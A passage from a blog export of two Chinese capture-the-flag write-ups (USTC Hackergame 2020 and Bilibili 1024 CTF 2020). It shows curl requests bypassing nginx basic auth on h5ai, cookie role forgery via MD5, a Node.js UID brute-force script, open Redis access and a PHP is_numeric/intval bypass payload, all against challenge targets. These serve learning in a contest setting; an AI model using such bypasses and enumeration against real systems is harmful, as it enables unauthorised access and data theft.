href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// 